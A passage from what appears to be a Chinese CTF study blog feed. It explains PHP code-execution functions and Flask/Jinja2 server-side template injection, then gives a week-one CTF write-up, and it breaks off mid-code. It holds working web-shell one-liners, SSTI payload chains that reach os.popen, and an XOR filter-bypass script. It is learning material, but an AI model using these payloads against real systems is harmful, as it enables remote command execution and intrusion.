class="hljs autoit"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;echo 1;&#x27;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>eval规范严格，必须符合PHP代码要求</p><p>(1)eval() 函数把字符串按照 PHP 代码来计算（计算&#x3D;执行）。<br>(2)该字符串必须是合法的 PHP 代码，且必须以分号结尾。<br>(3)如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。</p><p>eval是一个语言构造器而不是一个函数，不能被可变函数调用</p><p>这也是为什么当把代码使用拼接的方式时时<code>&lt;?php $_POST[&#39;1&#39;]($_POST[&#39;2&#39;]); ?&gt;</code>  虽然逻辑上最后是<code>&lt;?php @eval($_POST[&#39;2&#39;]); ?&gt;</code>，却发现提示返回数据为空</p><h3 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h3><p>与eval()同样将字符串当做php代码执行</p><p>例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$_REQUEST</span>[cmd]); <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>assert函数中参数为表达式</p><p>如</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">assert</span></span>(<span class="hljs-title">phpinfo</span>()) </span><br></code></pre></td></tr></table></figure><p>assert没有那么严格，执行PHP表达式即可</p><p>assert()进行判断表达式，遇到false时也会继续执行</p><h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h3><p>执行一个正则表达式的搜索和替换</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">mixed</span> <span class="hljs-title function_ invoke__">preg_replace</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$pattern</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$replacement</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$subject</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$limit</span> = -<span class="hljs-number">1</span> [, <span class="hljs-keyword">int</span> &amp;<span class="hljs-variable">$count</span> ]] )<br></code></pre></td></tr></table></figure><ul><li>$pattern: 要搜索的模式，可以是字符串或一个字符串数组。（必须）</li><li>$replacement: 用于替换的字符串或字符串数组。（必须）</li><li>$subject: 要搜索替换的目标字符串或字符串数组。（必须）</li><li>$limit: 对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。</li><li>$count: ，为替换执行的次数。</li></ul><p>如果 subject 是一个数组， preg_replace() 返回一个数组， 其他情况下返回一个字符串。 </p><p>如果匹配被查找到，替换后的 subject 被返回，其他情况下 返回没有改变的 subject。如果发生错误，返回 NULL。</p><p>preg_replace() 的第一个参数如果存在 &#x2F;e 模式修饰符，则允许代码执行。</p><p>例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$var</span> = <span class="hljs-string">&quot;&lt;tag&gt;phpinfo()&lt;/tag&gt;&quot;</span>;<br><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/&lt;tag&gt;(.*?)&lt;\/tag&gt;/e&quot;</span>,<span class="hljs-string">&quot;addslashes(\\1)&quot;</span>, <span class="hljs-variable">$var</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//phpinfo()成功执行</span><br></code></pre></td></tr></table></figure><p>如果没有 &#x2F;e 修饰符，可以尝试 %00 截断。</p><h3 id="文件操作函数"><a href="#文件操作函数" class="headerlink" title="文件操作函数"></a>文件操作函数</h3><h4 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents()"></a>file_put_contents()</h4><p>把一个字符串写入文件中</p><p>与依次调用 fopen()，fwrite() 以及 fclose() 功能一样。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">file<span class="hljs-constructor">_put_contents(<span class="hljs-params">file</span>,<span class="hljs-params">data</span>,<span class="hljs-params">mode</span>,<span class="hljs-params">context</span>)</span><br></code></pre></td></tr></table></figure><table><thead><tr><th><em>file</em></th><th>必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。</th></tr></thead><tbody><tr><td><em>data</em></td><td>可选。规定要写入文件的数据。可以是字符串、数组或数据流。</td></tr><tr><td><em>mode</em></td><td>可选。规定如何打开&#x2F;写入文件。可能的值：  FILE_USE_INCLUDE_PATH FILE_APPEND LOCK_EX</td></tr><tr><td><em>context</em></td><td>可选。规定文件句柄的环境。 <em>context</em> 是一套可以修改流的行为的选项。若使用 null，则忽略。</td></tr></tbody></table><p>data 可以是数组（但不能是多维数组）。</p><p>该函数将返回写入到文件内数据的字节数。</p><p>使用 FILE_APPEND 可避免删除文件中已有的内容。</p><p>例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;Hello World. Testing!&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="fputs-函数写入文件"><a href="#fputs-函数写入文件" class="headerlink" title="fputs() 函数写入文件"></a>fputs() 函数写入文件</h4><p>fputs() 函数是 fwrite() 函数的别名。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">fputs(<span class="hljs-built_in">file</span>,<span class="hljs-built_in">string</span>,<span class="hljs-built_in">length</span>)<br></code></pre></td></tr></table></figure><table><thead><tr><th><em>file</em></th><th>必需。规定要写入的打开文件。</th></tr></thead><tbody><tr><td><em>string</em></td><td>必需。规定要写入文件的字符串。</td></tr><tr><td><em>length</em></td><td>可选。规定要写入的最大字节数。</td></tr></tbody></table><p>fwrite() 把 string 的内容写入文件指针 file 处。 如果指定了 length，当写入了 length 个字节或者写完了 string 以后，写入就会停止，视乎先碰到哪种情况。</p><p>fwrite() 返回写入的字符数，出现错误时则返回 false。</p><p>例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;Hello World. Testing!&quot;</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h2><h3 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h3><p>执行的匹配正则表达式</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">int preg_match ( string $pattern , string $subject [,<span class="hljs-built_in"> array </span>&amp;$matches [,<span class="hljs-built_in"> int </span>$flags = 0 [,<span class="hljs-built_in"> int </span>$offset = 0 ]]] )<br></code></pre></td></tr></table></figure><ul><li>$pattern: 要搜索的模式，字符串形式。（必须）</li><li>$subject: 输入字符串。（必须）</li><li>$matches: 如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。</li><li>$flags：flags 可以被设置为以下标记值：<ol><li>PREG_OFFSET_CAPTURE:  如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量(相对于目标字符串的)。 注意：这会改变填充到matches参数的数组，使其每个元素成为一个由 第0个元素是匹配到的字符串，第1个元素是该匹配字符串 在目标字符串subject中的偏移量。</li></ol></li><li>offset: 通常，搜索从目标字符串的开始位置开始。可选参数 offset 用于 指定从目标字符串的某个未知开始搜索(单位是字节)。</li></ul><p>返回 pattern 的匹配次数。 它的值将是 0 次（不匹配）或 1 次，因为 preg_match() 在第一次匹配后 将会停止搜索。preg_match_all() 不同于此，它会一直搜索subject 直到到达结尾。 如果发生错误preg_match()返回 FALSE。</p><hr><h1 id="flaskssti"><a href="#flaskssti" class="headerlink" title="flaskssti"></a>flaskssti</h1><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>可以注入的原因在于过于信任用户，服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分</p><h3 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h3><p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。</p><h3 id="SSTI服务器模板注入"><a href="#SSTI服务器模板注入" class="headerlink" title="SSTI服务器模板注入"></a>SSTI服务器模板注入</h3><p>SSTI即(server-side template injection)服务器模板注入。SST服务器模板信任了用户的输入，并且执行这些内容，包括执行本机函数。通过输入一些指令在后端处理进行了语句的拼接然后执行。</p><hr><h3 id="python模板注入"><a href="#python模板注入" class="headerlink" title="python模板注入"></a>python模板注入</h3><p>python模板注入漏洞的产生在于Flask应用框架中<code>render_template_string</code>函数在渲染模板的时候使用了%s来动态的替换字符串，而且Flask模板中使用了<code>Jinja2</code>作为模板渲染引擎，<code>&#123;&#123;&#125;&#125;</code>在<code>Jinja2</code>中作为变量包裹标识符，在渲染的时候将<code>&#123;&#123;&#125;&#125;</code>包裹的内容作为变量解析替换，比如<code>&#123;undefined&#123;1+1&#125;&#125;</code>会被解析成2。</p><h2 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h2><p>Flask是一个使用 Python 编写的Web应用框架。其WSGI（Web服务器网关接口）工具箱采用 Werkzeug ，模板引擎则使用Jinja2。</p><p>Jinja2引擎存在三种语法：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs crystal">控制结构<span class="hljs-template-variable">&#123;% %&#125;</span><br>变量取值<span class="hljs-template-variable">&#123;&#123; &#125;&#125;</span><br>注释&#123;<span class="hljs-comment"># #&#125;</span><br><br><span class="hljs-template-variable">&#123;&#123;&#125;&#125;</span>语法表示一个变量，它是一种特殊的占位符。当用jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，jinja2支持python中所有的Python数据类型比如列表、字段、对象等。<br><br><span class="hljs-template-variable">&#123;&#123;&#125;&#125;</span>内的内容，Jinja2渲染时不只进行填充和替换，还能够执行部分表达式。<br></code></pre></td></tr></table></figure><h4 id="Python中常用于ssti的魔术方法"><a href="#Python中常用于ssti的魔术方法" class="headerlink" title="Python中常用于ssti的魔术方法"></a>Python中常用于ssti的魔术方法</h4><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">config：查看配置信息<br><span class="hljs-emphasis">__class__</span>：返回类型所属的对象<br><span class="hljs-emphasis">__mro__</span>：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。<br><span class="hljs-emphasis">__base__</span>：返回该对象所继承的基类// <span class="hljs-emphasis">__base__</span>和<span class="hljs-emphasis">__mro__</span>都是用来寻找基类的<br><span class="hljs-emphasis">__subclasses__</span>：每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表<br><span class="hljs-emphasis">__init__</span>：类的初始化方法<br><span class="hljs-emphasis">__globals__</span>：对包含函数全局变量的字典的引用<br><span class="hljs-emphasis">__builtins__</span>：builtins即是引用，Python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于builtins却不用导入，它在任何模块都直接可见，所以可以直接调用引用的模块<br></code></pre></td></tr></table></figure><h4 id="ssti的一般流程："><a href="#ssti的一般流程：" class="headerlink" title="ssti的一般流程："></a>ssti的一般流程：</h4><p>获取基本类-&gt;获取基本类的子类-&gt;在子类中找到关于命令执行和文件读写的模块-&gt;使用其中的函数</p><h5 id="获取基类"><a href="#获取基类" class="headerlink" title="获取基类"></a>获取基类</h5><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sqf">[].<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span><br>[].<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>]  <span class="hljs-comment">//查看第一个基类</span><br>().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span><br>&#123;&#125;.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>   <br><span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span><br><span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>]       <span class="hljs-comment">//查看第三个基类</span><br><br></code></pre></td></tr></table></figure><h5 id="获取基本类的子类"><a href="#获取基本类的子类" class="headerlink" title="获取基本类的子类"></a>获取基本类的子类</h5><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">[].<span class="hljs-emphasis">__class__</span>.<span class="hljs-emphasis">__base__</span>.<span class="hljs-emphasis">__subclasses__</span>()<br></code></pre></td></tr></table></figure><h5 id="调用基本类的子类"><a href="#调用基本类的子类" class="headerlink" title="调用基本类的子类"></a>调用基本类的子类</h5><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>()[类的号]<br></code></pre></td></tr></table></figure><h4 id="四种方法读取内容"><a href="#四种方法读取内容" class="headerlink" title="四种方法读取内容"></a>四种方法读取内容</h4><h5 id="site-Printer类调用os-popen函数执行任意命令"><a href="#site-Printer类调用os-popen函数执行任意命令" class="headerlink" title="site._Printer类调用os.popen函数执行任意命令"></a>site._Printer类调用os.popen函数执行任意命令</h5><p>要找到os模块的位置，他是位于&lt;class ‘site._Printer’&gt;里面 ，结果查找在第71个类。<br>之后通过</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[]</span>.__class__.__mro__<span class="hljs-selector-attr">[2]</span>.<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[71]</span>.__init__.__globals__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;os&#x27;</span>]</span><span class="hljs-selector-class">.popen</span>(<span class="hljs-string">&#x27;命令行语句&#x27;</span>)<span class="hljs-selector-class">.read</span>()<br></code></pre></td></tr></table></figure><p>来调用服务器的控制台并显示。</p><h5 id="site-Printer类调用os-listdir函数执行查看本级目录下的文件"><a href="#site-Printer类调用os-listdir函数执行查看本级目录下的文件" class="headerlink" title="site._Printer类调用os.listdir函数执行查看本级目录下的文件"></a>site._Printer类调用os.listdir函数执行查看本级目录下的文件</h5><p><code>.__init__.__globals__[&#39;os&#39;].listdir(&#39;.&#39;)</code>函数也可以读取本级目录下的文件：</p><h5 id="catch-warnings类的linecache函数执行任意命令"><a href="#catch-warnings类的linecache函数执行任意命令" class="headerlink" title="catch_warnings类的linecache函数执行任意命令"></a>catch_warnings类的linecache函数执行任意命令</h5><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">[].<span class="hljs-emphasis">__class__</span>.<span class="hljs-emphasis">__base__</span>.<span class="hljs-emphasis">__subclasses__</span>()<br></code></pre></td></tr></table></figure><p>在所有模块中查找catch_warnings类的位置：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">[].<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">59</span>].<span class="hljs-variable">__init__</span>.func_globals.<span class="hljs-built_in">keys</span>()<br></code></pre></td></tr></table></figure><p>后查看catch_warnings类都存在哪些全局函数，可以找到linecache函数，os模块就在其中</p><p>后<code>linecache</code>函数通过调用<code>eval</code>函数执行<code>__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()</code>命令即可实现任意命令执行。</p><h5 id="遍历基类找函数执行-import-“os”-popen-“ls”-read-命令"><a href="#遍历基类找函数执行-import-“os”-popen-“ls”-read-命令" class="headerlink" title="遍历基类找函数执行__import __(“os”).popen(“ls”).read()命令"></a>遍历基类找函数执行<code>__import __(“os”).popen(“ls”).read()</code>命令</h5><p>直接通过循环遍历逐层找到<code>catch_warnings</code>类，然后找到<code>linecache</code>函数，之后调用<code>eval</code>函数执行<code>(&#39;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#39;)</code>，可以自动寻找相应函数实现任意命令执行</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="language-xml">//在所有继承的基类中</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><span class="language-xml">  //先找到catch_warnings类</span><br><span class="language-xml">  </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> b <span class="hljs-keyword">in</span> c.__init__.__globals__.values() %&#125;</span><span class="language-xml">//在所有catch_warnings类的全局变量函数的字典的引用中  </span><br><span class="language-xml">  </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><span class="language-xml">//某个函数的字典的引用的所属类和当前对象所属类相同</span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> &#x27;eval&#x27; <span class="hljs-keyword">in</span> b.keys() %&#125;</span><span class="language-xml">    //找到eval函数</span><br><span class="language-xml">      </span><span class="hljs-template-variable">&#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;) &#125;&#125;</span><span class="language-xml">  //导入cmd 执行popen里的命令 read读出数据</span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml">  </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml">  </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>web总结</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web-第一周</title>
    <link href="/2023/01/13/web-%E7%AC%AC%E4%B8%80%E5%91%A8/"/>
    <url>/2023/01/13/web-%E7%AC%AC%E4%B8%80%E5%91%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="1-RCE2"><a href="#1-RCE2" class="headerlink" title="1.RCE2"></a>1.RCE2</h2><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-13-163317.4op9y13h8a2o.jpg"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>()  去掉参数中最外层引号并执行剩余语句<br></code></pre></td></tr></table></figure><p>我们可以通过get来传入；</p><p>由于</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z0-9]/is&quot;</span>,<span class="hljs-variable">$code</span>)<br></code></pre></td></tr></table></figure><p>会过滤掉字母与数字，</p><p>且由于isset函数，无法使用数组</p><p>可以通过异或和url编码来进行绕过</p><p>脚本如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> <br>&#123;<br>    <span class="hljs-type">char</span> s[]=<span class="hljs-string">&quot;_GET&quot;</span>;<span class="hljs-comment">//字符串内容</span><br>    <span class="hljs-type">int</span> n=<span class="hljs-built_in">strlen</span>(s);<br>    <span class="hljs-type">int</span> d[n];<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;n;i++)&#123;<br>        d[i]=s[i]^<span class="hljs-number">0xff</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%%%lx&quot;</span>,d[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先利用get传入phpinfo测试</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-13-172707.3v8sz61cbv4.jpg"></p><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><p>然后开始传入执行函数system</p><p>直接传system(“ls”)不行，分开传入</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/web/2023-01-13-193051.v0awjuv1500.jpg"></p><p>向上找，找到flag</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/web/2023-01-13-221318.79qj21vcvm2o.jpg"></p><p>然后cat即可</p><h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><p>然后我觉得可以传入eval($_POST[‘1’]);，不过连接失败了就不太懂；</p><p>然后使用了assert函数</p><p>代码示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-comment">//?a=assert&amp;b=phpinfo()</span><br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>](<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用phpinfo测试成功</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-13-181531.4nnuyh72civ4.jpg"></p><p>使用蚁剑连接</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/pwn/2023-01-13-181648.5r0k5spiu2v4.jpg"></p><h2 id="2-easy-ssti"><a href="#2-easy-ssti" class="headerlink" title="2.easy_ssti"></a>2.easy_ssti</h2><h3 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h3><p>可以注入的原因在于过于信任用户，服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分</p><h4 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h4><p>Flask是一个使用 Python 编写的Web应用框架。其WSGI（Web服务器网关接口）工具箱采用 Werkzeug ，模板引擎则使用Jinja2。</p><p>Jinja2引擎存在三种语法：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs crystal">控制结构<span class="hljs-template-variable">&#123;% %&#125;</span><br>变量取值<span class="hljs-template-variable">&#123;&#123; &#125;&#125;</span><br>注释&#123;<span class="hljs-comment"># #&#125;</span><br><br><span class="hljs-template-variable">&#123;&#123;&#125;&#125;</span>语法表示一个变量，它是一种特殊的占位符。当用jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，jinja2支持python中所有的Python数据类型比如列表、字段、对象等。<br><br><span class="hljs-template-variable">&#123;&#123;&#125;&#125;</span>内的内容，Jinja2渲染时不只进行填充和替换，还能够执行部分表达式。<br></code></pre></td></tr></table></figure><h4 id="Python中常用于ssti的魔术方法"><a href="#Python中常用于ssti的魔术方法" class="headerlink" title="Python中常用于ssti的魔术方法"></a>Python中常用于ssti的魔术方法</h4><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">config：查看配置信息<br><span class="hljs-emphasis">__class__</span>：返回类型所属的对象<br><span class="hljs-emphasis">__mro__</span>：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。<br><span class="hljs-emphasis">__base__</span>：返回该对象所继承的基类// <span class="hljs-emphasis">__base__</span>和<span class="hljs-emphasis">__mro__</span>都是用来寻找基类的<br><span class="hljs-emphasis">__subclasses__</span>：每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表<br><span class="hljs-emphasis">__init__</span>：类的初始化方法<br><span class="hljs-emphasis">__globals__</span>：对包含函数全局变量的字典的引用<br><span class="hljs-emphasis">__builtins__</span>：builtins即是引用，Python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于builtins却不用导入，它在任何模块都直接可见，所以可以直接调用引用的模块<br></code></pre></td></tr></table></figure><h4 id="ssti的一般流程："><a href="#ssti的一般流程：" class="headerlink" title="ssti的一般流程："></a>ssti的一般流程：</h4><p>获取基本类-&gt;获取基本类的子类-&gt;在子类中找到关于命令执行和文件读写的模块-&gt;使用其中的函数</p><h3 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy_ssti"></a>easy_ssti</h3><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>找到了提示henu{the_flag_is_this_dir}；当flag直接交（），本题结束。</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/web/2023-01-13-185311.c9mlaen7us8.jpg"></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>发现存在过滤</p><p><img src="https://cdn.staticaly.com/gh/lengkc/image@master/web/2023-01-13-185821.16d826gwf40w.jpg"></p><p>编码绕过</p><p>使用UTF-8编码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">code = <span 